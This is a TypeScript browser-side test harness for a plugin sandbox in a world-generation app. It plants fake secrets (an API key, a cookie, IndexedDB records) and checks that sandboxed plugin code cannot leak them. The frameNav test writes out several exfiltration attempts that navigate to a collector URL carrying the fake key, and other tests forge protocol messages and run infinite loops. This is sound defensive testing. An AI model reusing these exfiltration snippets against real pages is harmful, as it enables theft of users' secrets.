/**
 * scripts/sandbox-check.ts 在浏览器里调的那一半:网站页面这边开沙箱、递插件代码、记结果。
 * 打包成一个文件由检查脚本的假网站发出去;每项返回能直接 JSON 化的结果,判过没过在 Node 那边。
 */
import { generateCiv } from '../../../src/gen/civ';
import type { Civ } from '../../../src/gen/civ/types';
import { buildChronicle, type ChronicleEntry } from '../../../src/gen/civ/story/chronicle';
import { ownersAt } from '../../../src/gen/civ/engine/timeline';
import { EMPTY_EDITS, type WorldEdits } from '../../../src/gen/edits';
import { populationAt } from '../../../src/gen/readers/openQuery';
import { DEFAULT_PARAMS, generateWorld, type World } from '../../../src/gen/world';
import { PLUGIN_METHODS } from '../../../src/plugin/caps';
import type { CellLayer, MarkLayer, RegionLayer } from '../../../src/plugin/check';
import { PluginRefused, startPluginHost, type PickAnswer } from '../../../src/plugin/host';
import { frameCsp, SANDBOX_FLAGS } from '../../../src/plugin/protocol';
import { SandboxStopped, startPluginSandbox, type PluginSandbox, type StopReason } from '../../../src/plugin/sandbox';
import type { PanelNode, ViewInfo } from '../../../src/plugin/types';

const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));
const reasonOf = (e: unknown) => (e instanceof SandboxStopped ? e.reason : `not stopped: ${String(e)}`);

/** 网站页面在这两个频道上听着,插件喊话被听到就算漏 */
const heard: unknown[] = [];
for (const name of ['civ-atlas', 'civ-atlas-check']) new BroadcastChannel(name).onmessage = (e) => heard.push(e.data);

async function seed() {
  localStorage.setItem('civ-atlas:ai-secrets', '{"deepseek":"sk-CHECK-SECRET"}');
  document.cookie = 'session=CHECK-COOKIE';
  await new Promise<void>((res, rej) => {
    const r = indexedDB.open('civ-atlas-check-vault', 1);
    r.onupgradeneeded = () => r.result.createObjectStore('manifests');
    r.onsuccess = () => {
      const tx = r.result.transaction('manifests', 'readwrite');
      tx.objectStore('manifests').put({ title: 'CHECK-WORLD' }, 'w1');
      tx.oncomplete = () => res();
      tx.onerror = () => rej(tx.error);
    };
    r.onerror = () => rej(r.error);
  });
  return 'seeded';
}

/** 插件在沙箱里把坏事试一遍 */
async function battery(code: string) {
  heard.length = 0;
  let done: (v: unknown) => void = () => {};
  const got = new Promise((r) => (done = r));
  const t0 = performance.now();
  const sb = await startPluginSandbox(code, { onMessage: (d) => (d as { type?: string })?.type === 'results' && done(d) });
  const readyMs = Math.round(performance.now() - t0);
  const out = await Promise.race([got, sleep(90_000).then(() => ({ type: 'timeout' }))]);
  await sleep(300);
  const stoppedBefore = sb.stopped;
  sb.stop();
  await sleep(300);
  return { readyMs, stoppedBefore, out, heard: heard.slice(), frames: document.querySelectorAll('iframe').length };
}

/** 一来一回、转交 36k 个数 */
async function echo() {
  const msgs: unknown[] = [];
  const sb = await startPluginSandbox(
    "civAtlas.post('early'); civAtlas.onCall((d) => { let s = 0; for (const x of d.a) s += x; return { s, n: d.a.length, back: d.a }; });",
    { onMessage: (d) => msgs.push(d) },
  );
  const a = new Float32Array(36_000).fill(1);
  const t0 = performance.now();
  const r = (await sb.call({ a }, { transfer: [a.buffer] })) as { s: number; n: number; back: Float32Array };
  const ms = performance.now() - t0;
  let thrown = '';
  try {
    await sb.call('x', { timeoutMs: 2000 });
  } catch (e) {
    thrown = e instanceof Error ? e.message : String(e);
  }
  let uncloneable = '';
  try {
    await sb.call({ f: () => 1 });
  } catch (e) {
    uncloneable = `${(e as Error).name}, ${sb.stopped ?? 'still running'}`;
  }
  await sb.ping();
  sb.stop();
  await sleep(300);
  return {
    s: r.s,
    n: r.n,
    backIsArray: r.back instanceof Float32Array && r.back.length === 36_000,
    detached: a.byteLength === 0,
    ms: +ms.toFixed(1),
    errorReply: thrown,
    uncloneable,
    early: msgs[0] === 'early',
    stopped: sb.stopped,
    afterStop: await sb.call('x').then(
      () => 'replied',
      (e) => reasonOf(e),
    ),
    frames: document.querySelectorAll('iframe').length,
  };
}

/** 两个插件各在各的来源:B 的频道喊话 A 听不到 */
async function isolation() {
  heard.length = 0;
  const aHeard: unknown[] = [];
  const a = await startPluginSandbox(
    "const c = new BroadcastChannel('civ-atlas-check'); c.onmessage = (e) => civAtlas.post(e.data); civAtlas.onCall(() => { new BroadcastChannel('civ-atlas-check').postMessage('from-a-itself'); return 'ok'; });",
    { onMessage: (d) => aHeard.push(d) },
  );
  const b = await startPluginSandbox("civAtlas.onCall(() => { new BroadcastChannel('civ-atlas-check').postMessage('from-b'); return 'ok'; });");
  await a.call(1);
  await b.call(1);
  await sleep(500);
  a.stop();
  b.stop();
  return { aHeard, hostHeard: heard.slice() };
}

async function expectStop(code: string, opts: { startTimeoutMs?: number } = {}, after?: (sb: PluginSandbox) => Promise<unknown>) {
  const t0 = performance.now();
  let reason: StopReason | string = '';
  let detail = '';
  try {
    const sb = await startPluginSandbox(code, {
      ...opts,
      onStop: (r, d) => {
        reason = r;
        detail = d;
      },
    });
    if (after) await after(sb).catch(() => {});
    await sleep(1500);
    if (!reason) {
      reason = sb.stopped ?? 'still running';
      sb.stop();
    }
  } catch (e) {
    reason = reasonOf(e);
    detail = e instanceof SandboxStopped ? e.detail : '';
  }
  await sleep(200);
  return { reason, detail: detail.slice(0, 120), ms: Math.round(performance.now() - t0), frames: document.querySelectorAll('iframe').length };
}

const stops = {
  syntax: () => expectStop('this is not javascript ((('),
  throwLater: () => expectStop("setTimeout(() => { throw new Error('boom'); }, 50);"),
  garbage: () => expectStop("setTimeout(() => postMessage('garbage'), 50);"),
  forgedBoot: () => expectStop("setTimeout(() => postMessage({ from: 'boot', kind: 'error', message: 'forged' }), 50);"),
  wrongVersion: () => expectStop("setTimeout(() => postMessage({ v: 99, kind: 'post', data: 1 }), 50);"),
  strayReply: () => expectStop("setTimeout(() => postMessage({ v: 1, kind: 'reply', id: 12345, ok: true, data: 1 }), 50);"),
  topLevelLoop: () => expectStop('for (;;) {}', { startTimeoutMs: 1500 }),
  pingLoop: () => expectStop('setTimeout(() => { for (;;) {} }, 100);', {}, async (sb) => (await sleep(300), sb.ping(1000))),
};

/** 死循环:界面照常、call 超时后停掉;CPU 降没降在 Node 那边量 */
let spinning: Promise<unknown> | null = null;
async function spinStart() {
  const sb = await startPluginSandbox('civAtlas.onCall(() => { for (;;) {} });');
  await sb.ping();
  let maxGap = 0;
  let last = performance.now();
  const tick = setInterval(() => {
    const now = performance.now();
    maxGap = Math.max(maxGap, now - last);
    last = now;
  }, 10);
  const t0 = performance.now();
  spinning = sb.call('spin', { timeoutMs: 2500 }).then(
    () => ({ reason: 'replied' }),
    (e) => {
      clearInterval(tick);
      return { reason: reasonOf(e), stopped: sb.stopped, maxGapMs: Math.round(maxGap), stopAfterMs: Math.round(performance.now() - t0) };
    },
  );
  return 'spinning';
}
const spinWait = () => spinning;

/** 框的页面里跑的代码(模拟插件跑出了线程、或引导代码被人改坏):用和沙箱一样的属性和内容安全策略,只是放行的散列换成这段代码的 */
async function rawFrame(script: string): Promise<HTMLIFrameElement> {
  const digest = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(script));
  const hash = btoa(String.fromCharCode(...new Uint8Array(digest)));
  const f = document.createElement('iframe');
  f.setAttribute('sandbox', SANDBOX_FLAGS);
  f.srcdoc = `<!doctype html><html><head><meta http-equiv="Content-Security-Policy" content="${frameCsp(`'sha256-${hash}'`)}"></head><body><script>${script}</script></body></html>`;
  document.body.append(f);
  return f;
}

/** 框自己跳走、带走数据:几种跳法各开一个框 */
async function frameNav(collect: string) {
  const ways: Record<string, string> = {
    self: `location.href = '${collect}/nav-self?d=sk-CHECK-SECRET';`,
    refresh: `const m = document.createElement('meta'); m.httpEquiv = 'refresh'; m.content = '0;url=${collect}/nav-refresh'; document.head.append(m);`,
    link: `const a = document.createElement('a'); a.href = '${collect}/nav-link'; document.body.append(a); a.click();`,
    top: `top.location.href = '${collect}/nav-top';`,
    open: `window.open('${collect}/nav-open');`,
  };
  const ran: string[] = [];
  const frames: HTMLIFrameElement[] = [];
  const on = (e: MessageEvent) => {
    if (typeof e.data === 'string' && e.data.startsWith('ran:')) ran.push(e.data.slice(4));
  };
  addEventListener('message', on);
  for (const [k, code] of Object.entries(ways)) {
    frames.push(await rawFrame(`parent.postMessage('ran:${k}', '*'); setTimeout(() => { try { ${code} } catch (e) { parent.postMessage('ran:${k} threw ' + e.name, '*'); } }, 50);`));
  }
  await sleep(2000);
  removeEventListener('message', on);
  frames.forEach((f) => f.remove());
  return { ran: ran.sort() };
}

/** 对照:插件代码直接跑在框的页面里(少了线程那一层) */
async function frameBattery(code: string) {
  const f = await rawFrame(code);
  return new Promise((res) => {
    const on = (e: MessageEvent) => {
      if (e.source !== f.contentWindow || (e.data as { type?: string })?.type !== 'results') return;
      removeEventListener('message', on);
      f.remove();
      res(e.data);
    };
    addEventListener('message', on);
    setTimeout(() => res({ type: 'timeout' }), 90_000);
  });
}

/** 对照:网站自己开的线程连得出去(收信站这时候必须收到,证明它听得见) */
async function siteWorker(collect: string) {
  const code = `fetch('${collect}/site-worker').then((r) => postMessage('ok ' + r.status), (e) => postMessage('err ' + e.message));`;
  const w = new Worker(URL.createObjectURL(new Blob([code], { type: 'text/javascript' })));
  return new Promise((res) => {
    w.onmessage = (e) => {
      w.terminate();
      res(e.data);
    };
    setTimeout(() => res('timeout'), 5000);
  });
}

// ---- 插件接口 ----

let small: { world: World; civ: Civ; chronicle: ChronicleEntry[] } | null = null;
/** 检查用的小世界(种子 7、3000 个地块、推 800 年) */
function smallWorld() {
  if (!small) {
    const world = generateWorld({ ...DEFAULT_PARAMS, seed: 7, cells: 3000 });
    const civ = generateCiv(world, { endYear: 800 });
    small = { world, civ, chronicle: buildChronicle(civ) };
  }
  return small;
}
const total = (a: ArrayLike<number>) => {
  let s = 0;
  for (let i = 0; i < a.length; i++) s += a[i];
  return s;
};

/**
 * 在真沙箱里开一个插件,世界是上面的小世界;插件说 listening 以后改看的年份、选中的东西,点面板上的 go。
 * 等插件交回 results,或者插件被停掉
 */
async function api(code: string, requires: string[]) {
  const { world, civ, chronicle } = smallWorld();
  const elevBefore = total(world.elevation);
  const view: ViewInfo = { year: 600, selected: null, visible: null, layer: 'polities' };
  const watchers = new Set<() => void>();
  const sink = { panels: [] as (number | null)[], layers: [] as [string, string | null][], logs: [] as string[] };
  let edits: WorldEdits = { ...EMPTY_EDITS, names: { 'polity:c1#0': '甲' }, marks: [{ id: 1, title: '故乡', color: 'red', from: 0, at: [10, 20] }] };
  const commits: { names: number; marks: string[]; interventions: number }[] = [];
  let stopped: string | null = null;
  let finish: (v: unknown) => void = () => {};
  const done = new Promise((r) => (finish = r));
  const t0 = performance.now();
  let host: Awaited<ReturnType<typeof startPluginHost>> | null = null;
  const onMessage = async (d: unknown) => {
    const m = d as { type?: string; out?: unknown };
    if (m?.type === 'listening') {
      Object.assign(view, { year: 700 });
      watchers.forEach((w) => w());
      Object.assign(view, { selected: { kind: 'polity', key: 'polity:c1#0' } });
      watchers.forEach((w) => w());
      await sleep(50);
      host?.panelAction('go');
      host?.panelAction('nope');
    } else if (m?.type === 'results') finish(m.out);
  };
  try {
    host = await startPluginHost({
      plugin: { id: 'check', requires },
      code,
      source: {
        world: () => world,
        civ: () => civ,
        edits: () => edits,
        title: () => '检查用的世界',
        chronicle: () => chronicle,
        notes: () => [{ key: 'k', kind: 'book', title: '第一卷', text: '……', createdAt: '', provider: 'p', model: 'm' }],
        view: () => view,
        watchView: (fn) => (watchers.add(fn), () => watchers.delete(fn)),
        pick: async (req) => (req.kind === 'cell' ? { cell: 5 } : req.kind === 'cells' ? { cells: [1, 2, 3] } : { x0: 0, y0: 0, x1: 10, y1: 10, cells: [7, 8] }),
        commit: (next) => {
          edits = next;
          commits.push({ names: Object.keys(next.names).length, marks: (next.marks ?? []).map((m) => m.title), interventions: next.interventions.length });
          return null;
        },
      },
      sink: { panel: (p) => sink.panels.push(p ? p.length : null), layer: (lid, l) => sink.layers.push([lid, l ? l.kind : null]), log: (t) => sink.logs.push(t) },
      onMessage,
      onStop: (r, d) => {
        stopped = d ? `${r} (${d})` : r;
        finish(null);
      },
    });
  } catch (e) {
    return { refused: e instanceof PluginRefused ? e.kind : String(e), frames: document.querySelectorAll('iframe').length };
  }
  const out = await Promise.race([done, sleep(60_000).then(() => 'timeout')]);
  const stoppedBefore = stopped;
  host.stop();
  await sleep(200);
  const owned = new Set<number>();
  const own = ownersAt(civ, 600);
  for (let i = 0; i < world.mesh.n; i++) {
    const r = civ.regions.of[i];
    if (r >= 0 && own.polity[r] >= 0) owned.add(own.polity[r]);
  }
  return {
    out,
    stoppedBefore,
    ms: Math.round(performance.now() - t0),
    sink,
    commits,
    worldIntact: world.elevation.length === world.mesh.n && total(world.elevation) === elevBefore,
    expect: { cells: world.mesh.n, elev: elevBefore, ownedPolities: owned.size, rivers: world.rivers.length },
    frames: document.querySelectorAll('iframe').length,
  };
}

/** 清单里什么能力都没要的插件:把每个调用试一遍,事件也一个都不该收到 */
const NOTHING = `(async () => {
  const codes = {};
  const events = [];
  for (const k of ['view.year', 'view.select', 'panel.action']) civAtlas.on(k, () => events.push(k));
  for (const name of ${JSON.stringify(Object.keys(PLUGIN_METHODS))}) {
    if (name === 'log') continue;
    try { await civAtlas.request(name, {}); codes[name] = 'ok'; } catch (e) { codes[name] = e.code; }
  }
  civAtlas.post({ type: 'listening' });
  await new Promise((r) => setTimeout(r, 1000));
  civAtlas.post({ type: 'results', out: { codes, events } });
})();`;

/** 越界就停的几种:结果是停的原因 */
const apiStops = {
  flood: () => api("for (let i = 0; i < 400; i++) civAtlas.log('x');", []),
  oversize: () => api("civAtlas.post('x'.repeat(3000000));", []),
  badCall: () => api("setTimeout(() => postMessage({ v: 1, kind: 'req', id: 1, call: 'no good' }), 50);", []),
  forgedRes: () => api("setTimeout(() => postMessage({ v: 1, kind: 'res', id: 1, ok: true, data: 1 }), 50);", []),
  forgedEvent: () => api("setTimeout(() => postMessage({ v: 1, kind: 'event', name: 'view.year', data: 1 }), 50);", []),
  refused: () => api('', ['net.fetch@1']),
};
const apiNothing = () => api(NOTHING, []);

// ---- 示例插件 ----

const exampleWorlds = new Map<number, { world: World; civ: Civ }>();
/** 示例插件用的小世界(3000 个地块、推 800 年;种子 7 就是上面那个) */
function exampleWorld(seed: number) {
  if (seed === 7) return smallWorld();
  let w = exampleWorlds.get(seed);
  if (!w) {
    const world = generateWorld({ ...DEFAULT_PARAMS, seed, cells: 3000 });
    exampleWorlds.set(seed, (w = { world, civ: generateCiv(world, { endYear: 800 }) }));
  }
  return w;
}

/** 示例插件请用的人点选时答什么:city 人口最多的城,far 同一块陆地上离它最远的城,box 以人口最多的城为中心的一个框 */
function examplePicks(world: World, civ: Civ, year: number, kinds: string[]): PickAnswer[] {
  const { mesh } = world;
  const alive = civ.settlements.filter((s) => s.founded <= year && (s.ended === undefined || year < s.ended));
  if (!alive.length) return [];
  const big = alive.reduce((a, s) => (populationAt(s, year) > populationAt(a, year) ? s : a));
  const land = new Uint8Array(mesh.n);
  const stack = [big.cell];
  land[big.cell] = 1;
  while (stack.length) {
    const i = stack.pop()!;
    for (let k = mesh.adjStart[i]; k < mesh.adjStart[i + 1]; k++) {
      const j = mesh.adj[k];
      if (!land[j] && world.water[j] === 0) stack.push(j), (land[j] = 1);
    }
  }
  const d2 = (a: number, b: number) => {
    const dx = Math.abs(mesh.x[a] - mesh.x[b]);
    return Math.min(dx, world.width - dx) ** 2 + (mesh.y[a] - mesh.y[b]) ** 2;
  };
  const far = alive.filter((s) => land[s.cell]).reduce((a, s) => (d2(s.cell, big.cell) > d2(a.cell, big.cell) ? s : a), big);
  const [cx, cy] = [mesh.x[big.cell], mesh.y[big.cell]];
  const [x0, x1, y0, y1] = [Math.max(0, cx - 180), Math.min(world.width, cx + 180), Math.max(0, cy - 120), Math.min(world.height, cy + 120)];
  const cells: number[] = [];
  for (let i = 0; i < mesh.n; i++) if (mesh.x[i] >= x0 && mesh.x[i] <= x1 && mesh.y[i] >= y0 && mesh.y[i] <= y1) cells.push(i);
  return kinds.map((k) => (k === 'city' ? { cell: big.cell } : k === 'far' ? { cell: far.cell } : { x0, y0, x1, y1, cells }));
}

/** 图层钉快照的样子:地块图层只留统计(每个值各几块),标注原样 */
function layerDigest(l: CellLayer | RegionLayer | MarkLayer) {
  if (l.kind === 'marks') return { ...l, items: l.items.map((it) => ({ ...it, cells: it.cells && Array.from(it.cells), points: it.points && Array.from(it.points) })) };
  const { values, ...rest } = l;
  const counts: Record<string, number> = {};
  let drawn = 0;
  let sum = 0;
  for (const v of values) {
    if (Number.isNaN(v)) continue;
    drawn++;
    sum += v;
    counts[v] = (counts[v] ?? 0) + 1;
  }
  return { ...rest, cells: values.length, drawn, sum, counts: Object.keys(counts).length <= 32 ? counts : null };
}

interface ExampleStep {
  year?: number;
  action?: { id: string; value?: unknown };
}

/**
 * 示例插件在真沙箱里对一个世界跑一遍:点选照 picks 依次答;每一步之前等插件安静下来,记一帧(面板、图层),
 * 再改看的年份、点面板上的控件;最后再记一帧
 */
async function example(code: string, plugin: { id: string; requires: string[]; optional?: string[] }, seed: number, picks: string[], steps: ExampleStep[]) {
  const { world, civ } = exampleWorld(seed);
  const view: ViewInfo = { year: civ.endYear, selected: null, visible: null, layer: null };
  const answers = examplePicks(world, civ, view.year, picks);
  const watchers = new Set<() => void>();
  let edits: WorldEdits = EMPTY_EDITS;
  let panel: PanelNode[] | null = null;
  const layers = new Map<string, unknown>();
  const asked: string[] = [];
  const commits: unknown[] = [];
  const logs: string[] = [];
  let stopped: string | null = null;
  let last = performance.now();
  const touch = () => void (last = performance.now());
  let host: Awaited<ReturnType<typeof startPluginHost>>;
  try {
    host = await startPluginHost({
      plugin,
      code,
      source: {
        world: () => world,
        civ: () => civ,
        edits: () => edits,
        title: () => `种子 ${seed}`,
        view: () => view,
        watchView: (fn) => (watchers.add(fn), () => watchers.delete(fn)),
        pick: async (req) => {
          touch();
          asked.push(`${req.kind} ${req.hint}`);
          return answers.shift() ?? null;
        },
        commit: (next) => {
          commits.push({ names: next.names, interventions: next.interventions, marks: (next.marks ?? []).slice(edits.marks?.length ?? 0) });
          edits = next;
          touch();
          return null;
        },
      },
      sink: {
        panel: (p) => ((panel = p), touch()),
        layer: (lid, l) => (l ? layers.set(lid, layerDigest(l)) : layers.delete(lid), touch()),
        log: (t) => (logs.push(t), touch()),
      },
      onStop: (r, d) => (stopped = d ? `${r} (${d})` : r),
    });
  } catch (e) {
    return { refused: String(e) };
  }
  // 安静 = 半秒没交来东西、线程也空着(插件算得久时 ping 要等它算完)
  const settle = async () => {
    const t0 = performance.now();
    while (performance.now() - t0 < 30_000) {
      while (performance.now() - last < 500 && performance.now() - t0 < 30_000) await sleep(50);
      await host.sandbox.ping(10_000).catch(() => {});
      if (performance.now() - last >= 500) return;
    }
  };
  const frames: unknown[] = [];
  const frame = () => frames.push({ panel: structuredClone(panel), layers: Object.fromEntries([...layers].sort(([a], [b]) => (a < b ? -1 : 1))) });
  for (const s of steps) {
    await settle();
    frame();
    if (s.year !== undefined) {
      view.year = s.year;
      watchers.forEach((w) => w());
    }
    if (s.action) host.panelAction(s.action.id, s.action.value);
    touch();
  }
  await settle();
  frame();
  const stoppedBefore = stopped;
  host.stop();
  await sleep(200);
  return { stoppedBefore, snapshot: { asked, frames, commits, logs }, frames: document.querySelectorAll('iframe').length };
}

const check = { seed, battery, echo, isolation, stops, spinStart, spinWait, frameNav, frameBattery, siteWorker, api, apiNothing, apiStops, example };
(window as unknown as { check: typeof check }).check = check;
(window as unknown as { ready: boolean }).ready = true;
